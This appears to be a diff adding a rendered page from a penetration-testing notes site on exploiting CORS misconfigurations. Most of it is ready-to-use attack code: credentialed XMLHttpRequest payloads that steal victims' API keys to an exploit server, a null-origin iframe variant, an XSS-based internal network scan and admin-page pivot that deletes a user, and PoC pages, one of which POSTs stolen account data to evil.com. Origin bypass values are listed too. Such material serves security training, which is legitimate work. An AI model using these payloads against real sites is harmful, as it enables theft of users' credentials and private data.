+  <span class="md-ellipsis">
+    Post Exploitation
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            Post Exploitation
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../post_exploitation/linux/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../post_exploitation/windows/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../oscp_tips/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OSCP Tips
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../about/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    About
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="cors">CORS</h1>
+<h2 id="tools">Tools</h2>
+<div class="highlight"><pre><span></span><code><span class="c1"># https://github.com/s0md3v/Corsy</span>
+python3<span class="w"> </span>corsy.py<span class="w"> </span>-u<span class="w"> </span>https://example.com
+<span class="c1"># https://github.com/chenjj/CORScanner</span>
+python<span class="w"> </span>cors_scan.py<span class="w"> </span>-u<span class="w"> </span>example.com
+<span class="c1"># https://github.com/Shivangx01b/CorsMe</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;https://example.com&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>./Corsme<span class="w"> </span>
+cat<span class="w"> </span>subdomains.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>./httprobe<span class="w"> </span>-c<span class="w"> </span><span class="m">70</span><span class="w"> </span>-p<span class="w"> </span><span class="m">80</span>,443,8080,8081,8089<span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>http_https.txt
+cat<span class="w"> </span>http_https.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>./CorsMe<span class="w"> </span>-t<span class="w"> </span><span class="m">70</span>
+<span class="c1"># CORSPoc</span>
+<span class="c1"># https://tools.honoki.net/cors.html</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">URL accessed</th>
+<th style="text-align: left;">Access permitted?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">http://normal-website.com/example/</td>
+<td style="text-align: left;">Yes: same scheme, domain, and port</td>
+</tr>
+<tr>
+<td style="text-align: left;">http://normal-website.com/example2/</td>
+<td style="text-align: left;">Yes: same scheme, domain, and port</td>
+</tr>
+<tr>
+<td style="text-align: left;">https://normal-website.com/example/</td>
+<td style="text-align: left;">No: different scheme and port</td>
+</tr>
+<tr>
+<td style="text-align: left;">http://en.normal-website.com/example/</td>
+<td style="text-align: left;">No: different domain</td>
+</tr>
+<tr>
+<td style="text-align: left;">http://www.normal-website.com/example/</td>
+<td style="text-align: left;">No: different domain</td>
+</tr>
+<tr>
+<td style="text-align: left;">http://normal-website.com:8080/example/</td>
+<td style="text-align: left;">No: different port</td>
+</tr>
+</tbody>
+</table>
+<p _="%" endhint="endhint">{% hint style="info" %}
+In any site disclosing users &amp; passwords (or other sensitive info), try CORS.</p>
+<div class="highlight"><pre><span></span><code># Simple test
+curl --head -s &#39;http://example.com/api/v1/secret&#39; -H &#39;Origin: http://evil.com&#39;
+
+# There are various exceptions to the same-origin policy:
+• Some objects are writable but not readable cross-domain, such as the location object or the location.href property from iframes or new windows.
+• Some objects are readable but not writable cross-domain, such as the length property of the window object (which stores the number of frames being used on the page) and the closed property.
+• The replace function can generally be called cross-domain on the location object.
+• You can call certain functions cross-domain. For example, you can call the functions close, blur and focus on a new window. The postMessage function can also be called on iframes and new windows in order to send messages from one domain to another.
+
+# Access-Control-Allow-Origin header is included in the response from one website to a request originating from another website, and identifies the permitted origin of the request. A web browser compares the Access-Control-Allow-Origin with the requesting website&#39;s origin and permits access to the response if they match.
+
+CORS good example:
+https://hackerone.com/reports/235200
+
+- CORS with basic origin reflection:
+
+    With your browser proxying through Burp Suite, turn intercept off, log into your account, and click &quot;Account Details&quot;.
+    Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.
+    Send the request to Burp Repeater, and resubmit it with the added header: Origin: https://example.com
+    Observe that the origin is reflected in the Access-Control-Allow-Origin header.
+    Now browse to the exploit server, enter the following HTML, replacing $url with the URL for your specific lab and test it by clicking &quot;view exploit&quot;:
+    &lt;script&gt;
+       var req = new XMLHttpRequest();
+       req.onload = reqListener;
+       req.open(&#39;get&#39;,&#39;$url/accountDetails&#39;,true);
+       req.withCredentials = true;
+       req.send();
+
+       function reqListener() {
+           location=&#39;/log?key=&#39;+this.responseText;
+       };
+    &lt;/script&gt;
+    Observe that the exploit works - you have landed on the log page and your API key is in the URL.
+    Go back to the exploit server and click &quot;Deliver exploit to victim&quot;.
+    Click &quot;Access log&quot;, retrieve and submit the victim&#39;s API key to complete the lab.
+
+ - Whitelisted null origin value
+
+     With your browser proxying through Burp Suite, turn intercept off, log into your account, and click &quot;My account&quot;.
+    Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.
+    Send the request to Burp Repeater, and resubmit it with the added header Origin: null.
+    Observe that the &quot;null&quot; origin is reflected in the Access-Control-Allow-Origin header.
+    Now browse to the exploit server, enter the following HTML, replacing $url with the URL for your specific lab, $exploit-server-url with the exploit server URL, and test it by clicking &quot;view exploit&quot;:
+    &lt;iframe sandbox=&quot;allow-scripts allow-top-navigation allow-forms&quot; src=&quot;data:text/html, &lt;script&gt;
+       var req = new XMLHttpRequest ();
+       req.onload = reqListener;
+       req.open(&#39;get&#39;,&#39;$url/accountDetails&#39;,true);
+       req.withCredentials = true;
+       req.send();
+
+       function reqListener() {
+           location=&#39;$exploit-server-url/log?key=&#39;+encodeURIComponent(this.responseText);
+       };
+    &lt;/script&gt;&quot;&gt;&lt;/iframe&gt;
+    Notice the use of an iframe sandbox as this generates a null origin request. Observe that the exploit works - you have landed on the log page and your API key is in the URL.
+    Go back to the exploit server and click &quot;Deliver exploit to victim&quot;.
+    Click &quot;Access log&quot;, retrieve and submit the victim&#39;s API key to complete the lab.
+
+- CORS with insecure certificate
+
+    With your browser proxying through Burp Suite, turn intercept off, log into your account, and click &quot;Account Details&quot;.
+    Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.
+    Send the request to Burp Repeater, and resubmit it with the added header Origin: http://subdomain.lab-id where lab-id is the lab domain name.
+    Observe that the origin is reflected in the Access-Control-Allow-Origin header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.
+    Open a product page, click &quot;Check stock&quot; and observe that it is loaded using a HTTP URL on a subdomain.
+    Observe that the productID parameter is vulnerable to XSS.
+    Now browse to the exploit server, enter the following HTML, replacing $your-lab-url with your unique lab URL and $exploit-server-url with your exploit server URL and test it by clicking &quot;view exploit&quot;:
+    &lt;script&gt;
+       document.location=&quot;http://stock.$your-lab-url/?productId=4&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open(&#39;get&#39;,&#39;https://$your-lab-url/accountDetails&#39;,true); req.withCredentials = true;req.send();function reqListener() {location=&#39;https://$exploit-server-url/log?key=&#39;%2bthis.responseText; };%3c/script&gt;&amp;storeId=1&quot;
+    &lt;/script&gt;
+    Observe that the exploit works - you have landed on the log page and your API key is in the URL.
+    Go back to the exploit server and click &quot;Deliver exploit to victim&quot;.
+    Click &quot;Access log&quot;, retrieve and submit the victim&#39;s API key to complete the lab.
+
+- CORS with pivot attack
+
+Step 1
+First we need to scan the local network for the endpoint. Replace $collaboratorPayload with your own Collaborator payload or exploit server URL. Enter the following code into the exploit server. Click store then &quot;Deliver exploit to victim&quot;. Inspect the log or the Collaborator interaction and look at the code parameter sent to it.
+&lt;script&gt;
+var q = [], collaboratorURL = &#39;http://$collaboratorPayload&#39;;
+for(i=1;i&lt;=255;i++){
+  q.push(
+  function(url){
+    return function(wait){
+    fetchUrl(url,wait);
+    }
+  }(&#39;http://192.168.0.&#39;+i+&#39;:8080&#39;));
+}
+for(i=1;i&lt;=20;i++){
+  if(q.length)q.shift()(i*100);
+}
+function fetchUrl(url, wait){
+  var controller = new AbortController(), signal = controller.signal;
+  fetch(url, {signal}).then(r=&gt;r.text().then(text=&gt;
+    {
+    location = collaboratorURL + &#39;?ip=&#39;+url.replace(/^http:\/\//,&#39;&#39;)+&#39;&amp;code=&#39;+encodeURIComponent(text)+&#39;&amp;&#39;+Date.now()
+  }
+  ))
+  .catch(e =&gt; {
+  if(q.length) {
+    q.shift()(wait);
+  }
+  });
+  setTimeout(x=&gt;{
+  controller.abort();
+  if(q.length) {
+    q.shift()(wait);
+  }
+  }, wait);
+}
+&lt;/script&gt;
+Step 2
+Clear the code from stage 1 and enter the following code in the exploit server. Replace $ip with the IP address and port number retrieved from your collaborator interaction. Don&#39;t forget to add your Collaborator payload or exploit server URL again. Update and deliver your exploit. We will now probe the username field for an XSS vulnerability. You should retrieve a Collaborator interaction with foundXSS=1 in the URL or you will see foundXSS=1 in the log.
+&lt;script&gt;
+function xss(url, text, vector) {
+  location = url + &#39;/login?time=&#39;+Date.now()+&#39;&amp;username=&#39;+encodeURIComponent(vector)+&#39;&amp;password=test&amp;csrf=&#39;+text.match(/csrf&quot; value=&quot;([^&quot;]+)&quot;/)[1];
+}
+
+function fetchUrl(url, collaboratorURL){
+  fetch(url).then(r=&gt;r.text().then(text=&gt;
+  {
+    xss(url, text, &#39;&quot;&gt;&lt;img src=&#39;+collaboratorURL+&#39;?foundXSS=1&gt;&#39;);
+  }
+  ))
+}
+
+fetchUrl(&quot;http://$ip&quot;, &quot;http://$collaboratorPayload&quot;);
+&lt;/script&gt;
+
+Step 3
+Clear the code from stage 2 and enter the following code in the exploit server. Replace $ip with the same IP address and port number as in step 2 and don&#39;t forget to add your Collaborator payload or exploit server again. Update and deliver your exploit. Your Collaborator interaction or your exploit server log should now give you the source code of the admin page.
+&lt;script&gt;
+function xss(url, text, vector) {
+  location = url + &#39;/login?time=&#39;+Date.now()+&#39;&amp;username=&#39;+encodeURIComponent(vector)+&#39;&amp;password=test&amp;csrf=&#39;+text.match(/csrf&quot; value=&quot;([^&quot;]+)&quot;/)[1];
+}
+function fetchUrl(url, collaboratorURL){
+  fetch(url).then(r=&gt;r.text().then(text=&gt;
+  {
+    xss(url, text, &#39;&quot;&gt;&lt;iframe src=/admin onload=&quot;new Image().src=\&#39;&#39;+collaboratorURL+&#39;?code=\&#39;+encodeURIComponent(this.contentWindow.document.body.innerHTML)&quot;&gt;&#39;);
+  }
+  ))
+}
+
+fetchUrl(&quot;http://$ip&quot;, &quot;http://$collaboratorPayload&quot;);
+&lt;/script&gt;
+Step 4
+Read the source code retrieved from step 3 in your Collaborator interaction or on the exploit server log. You&#39;ll notice there&#39;s a form that allows you to delete a user. Clear the code from stage 3 and enter the following code in the exploit server. Replace $ip with the same IP address and port number as in steps 2 and 3. The code submits the form to delete carlos by injecting an iframe pointing to the /admin page.
+&lt;script&gt;
+function xss(url, text, vector) {
+  location = url + &#39;/login?time=&#39;+Date.now()+&#39;&amp;username=&#39;+encodeURIComponent(vector)+&#39;&amp;password=test&amp;csrf=&#39;+text.match(/csrf&quot; value=&quot;([^&quot;]+)&quot;/)[1];
+}
+
+function fetchUrl(url){
+  fetch(url).then(r=&gt;r.text().then(text=&gt;
+  {
+    xss(url, text, &#39;&quot;&gt;&lt;iframe src=/admin onload=&quot;var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\&#39;carlos\&#39;,f.submit()&quot;&gt;&#39;);
+  }
+  ))
+}
+
+fetchUrl(&quot;http://$ip&quot;);
+&lt;/script&gt;
+Click on &quot;Deliver exploit to victim&quot; to submit the code. Once you have submitted the form to delete user carlos then you have completed the lab.
+
+# JSONP
+
+In GET URL append “?callback=testjsonp”
+Response should be:
+testjsonp(&lt;json-data&gt;)
+
+# Bypasses
+Origin:null
+Origin:attacker.com
+Origin:attacker.target.com
+Origin:attackertarget.com
+Origin:sub.attackertarget.com
+</code></pre></div>
+<h2 id="cors-poc"><strong>CORS PoC</strong></h2>
+<div class="highlight"><pre><span></span><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;CORS PoC Exploit&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;center&gt;
+
+&lt;h1&gt;CORS Exploit&lt;br&gt;six2dez&lt;/h1&gt;
+&lt;hr&gt;
+&lt;div id=&quot;demo&quot;&gt;
+&lt;button type=&quot;button&quot; onclick=&quot;cors()&quot;&gt;Exploit&lt;/button&gt;
+&lt;/div&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+ function cors() {
+   var xhttp = new XMLHttpRequest();
+   xhttp.onreadystatechange = function() {
+     if(this.readyState == 4 &amp;&amp; this.status == 200) {
+        document.getElementById(&quot;demo&quot;).innerHTML = this.responseText;
+     }
+   };
+ xhttp.open(&quot;GET&quot;, &quot;http://&lt;vulnerable-url&gt;&quot;, true);
+ xhttp.withCredentials = true;
+ xhttp.send();
+ }
+&lt;/script&gt;
+
+&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div>
+<h2 id="cors-poc-2"><strong>CORS PoC 2</strong></h2>
+<div class="highlight"><pre><span></span><code>&lt;html&gt;
+&lt;script&gt;
+var http = new XMLHttpRequest();
+var url = &#39;Url&#39;;//Paste here Url
+var params = &#39;PostData&#39;;//Paste here POST data
+http.open(&#39;POST&#39;, url, true);
+
+//Send the proper header information along with the request
+http.setRequestHeader(&#39;Content-type&#39;, &#39;application/x-www-form-urlencoded&#39;);
+
+http.onreadystatechange = function() {//Call a function when the state changes.
+    if(http.readyState == 4 &amp;&amp; http.status == 200) {
+        alert(http.responseText);
+    }
+}
+http.send(params);
+
+&lt;/script&gt;
+&lt;/html&gt;
+</code></pre></div>
+<h2 id="cors-poc-3-sensitive-data-leakage">CORS PoC 3 - Sensitive Data Leakage</h2>
+<div class="highlight"><pre><span></span><code>&lt;html&gt;
+&lt;body&gt;
+&lt;button type=&#39;button&#39; onclick=&#39;cors()&#39;&gt;CORS&lt;/button&gt;
+&lt;p id=&#39;corspoc&#39;&gt;&lt;/p&gt;
+&lt;script&gt;
+function cors() {
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState == 4 &amp;&amp; this.status == 200) {
+var a = this.responseText; // Sensitive data from target1337.com about user account
+document.getElementById(&quot;corspoc&quot;).innerHTML = a;
+xhttp.open(&quot;POST&quot;, &quot;https://evil.com&quot;, true);// Sending that data to Attacker&#39;s website
+xhttp.withCredentials = true;
+console.log(a);
+xhttp.send(&quot;data=&quot;+a);
+}
+};
+xhttp.open(&quot;POST&quot;, &quot;https://target1337.com&quot;, true);
+xhttp.withCredentials = true;
+var body = &quot;requestcontent&quot;;
+var aBody = new Uint8Array(body.length);
+for (var i = 0; i &lt; aBody.length; i++)
+aBody[i] = body.charCodeAt(i); 
+xhttp.send(new Blob([aBody]));
+}
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div>
+<h2 id="cors-json-poc"><strong>CORS JSON PoC</strong></h2>
+<div class="highlight"><pre><span></span><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;JSONP PoC&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;center&gt;
+
+&lt;h1&gt;JSONP Exploit&lt;br&gt;YourTitle&lt;/h1&gt;
+&lt;hr&gt;
+&lt;div id=&quot;demo&quot;&gt;
+&lt;button type=&quot;button&quot; onclick=&quot;trigger()&quot;&gt;Exploit&lt;/button&gt;
+&lt;/div&gt;
+&lt;script&gt;
+
+function testjsonp(myObj) {
+  var result = JSON.stringify(myObj)
+  document.getElementById(&quot;demo&quot;).innerHTML = result;
+  //console.log(myObj)
+}
+
+&lt;/script&gt;
+
+&lt;script &gt;
+
+  function trigger() {
+    var s = document.createElement(&quot;script&quot;);
+    s.src = &quot;https://&lt;vulnerable-endpoint&gt;?callback=testjsonp&quot;;
+    document.body.appendChild(s);
+}
+
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.tabs", "navigation.sections", "navigation.indexes", "navigation.expand", "search.highlight", "search.share", "content.code.annotate", "content.tooltips", "toc.integrate"], "search": "../../../assets/javascripts/workers/search.f8cc74c7.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.c8b220af.min.js"></script>
+      
+    
+  </body>
+</html>
